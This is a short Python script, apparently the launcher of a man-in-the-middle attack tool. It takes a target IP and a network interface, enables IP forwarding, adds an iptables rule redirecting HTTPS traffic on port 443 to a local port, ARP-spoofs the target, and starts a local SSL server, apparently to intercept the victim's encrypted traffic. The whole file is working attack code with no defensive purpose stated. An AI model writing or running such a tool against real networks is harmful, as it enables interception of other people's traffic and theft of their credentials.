import arpspoof as spoof
import ssl_server
import netifaces as ni
from threading import Thread
import time
import argparse
import subprocess


if __name__ == "__main__":

    parser = argparse.ArgumentParser()
    parser.add_argument("target", type=str,
                        help="target ip")
    parser.add_argument("interface", type=str,
                        help="network interface")
    args = parser.parse_args()

    try:
        subprocess.run('echo "1" > /proc/sys/net/ipv4/ip_forward', shell=True)
        subprocess.run('iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 4433', shell=True)

        spoof.arpspoof(args.target, args.interface)
        host_ip = ni.ifaddresses(args.interface)[2][0]['addr']

        ssl_server.start_server(host_ip)
        while 1:
            time.sleep(1)
    except KeyboardInterrupt:
        print("[*] User interrupt")
        ssl_server.stop = 0
        spoof.stop = 0